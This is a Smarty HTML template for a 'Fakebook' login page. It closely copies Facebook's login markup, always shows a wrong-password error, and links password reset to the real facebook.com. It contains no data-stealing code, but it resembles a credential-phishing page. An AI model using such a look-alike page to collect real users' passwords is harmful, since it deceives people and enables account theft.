{include file='global/pghead.tpl'}
<head>
<title>{$conf.sitename} | {$lang.pagetitle}</title>
{include file='global/header.tpl'}
</head>
<body class="WelcomePage {$cbid} {$conf.lang_id}">
  <div id="non_footer" >
    <div id="page_height">
      <div id="menubar_container">
        <div id="menubar" class="menubar_logged_out clearfix">
          <div id="logobar">
            <a class="home" title="Go to Fakebook Home" href="{$home}"></a>
          </div>
        </div>
        <div class="signup_box clearfix">
          <div class="UILinkButton UILinkButton_SU">
            <input class="UILinkButton_A" type="submit" value="Sign Up" />
            <div class="UILinkButton_RW">
              <div class="UILinkButton_R"> </div>
            </div>
           <span class="signup_box_message">Fakebook helps you connect and share with the people in your life.</span>
          </div>
        </div>
      </div>
      <div id="content">
        <div class="UIFullPage_Container">
          <div class="UIInterstitialContainer clearfix">
            <div class="UIRoundedTransparentBox">
              <div class="UIRoundedTransparentBox_Inner clearfix">
                <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TL"> </div>
                <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_TR"> </div>
                <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BL"> </div>
                <div class="UIRoundedTransparentBox_Corner UIRoundedTransparentBox_BR"> </div>
                <div class="UIRoundedTransparentBox_Border clearfix">
                  <div class="UIInterstitialBox_Container clearfix">
                    <div class="UIOneOff_Container">
                      <div class="title_header add_border">
                        <h2 class="no_icon">Fakebook Login</h2>
                      </div>
                      <form action="login.php" method="post">
                        <div id="error">
                          <h2 id="standard_error" name="standard_error">Incorrect Email/Password Combination</h2>
                          <p id="standard_explanation" name="standard_explanation">
                            Fakebook passwords are case sensitive. Please check your CAPS lock key. You may also try clearing your browser's cache and cookies.
                          </p>
                        </div>
                        <div id="loginform" style="">
                          <div class="form_row clearfix">
                            <label id="label_email" for="email">Email:</label>
                            <input id="email" class="inputtext" type="text" value="email" name="email"/>
                          </div>
                          <div class="form_row clearfix">
                            <label id="label_pass" for="pass">Password:</label>
                            <input id="pass" class="inputpassword" type="password" value="" name="pass"/>
                          </div>
                          <label class="persistent">
                            <input id="persistent_inputcheckbox" class="inputcheckbox" type="checkbox" value="1" name="persistent"/>
                            <span id="remember_me_text">Remember me</span>
                          </label>
                          <div id="buttons" class="form_row clearfix">
                            <label></label>
                            <input id="login" class="inputsubmit" type="submit" name="login" value="Login"/>
                            or
                            <strong><a id="reg_btn_link" rel="nofollow" target="_blank" href="signup.php">Sign up for Fakebook</a></strong>
                          </div>
                          <p class="reset_password form_row">
                            <label></label>
                            <a href="http://www.facebook.com/reset.php?locale=en_US">Forgot your password?</a>
                          </p>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
{include file='global/footer.tpl'}
</body>
{include file='global/pgfoot.tpl'}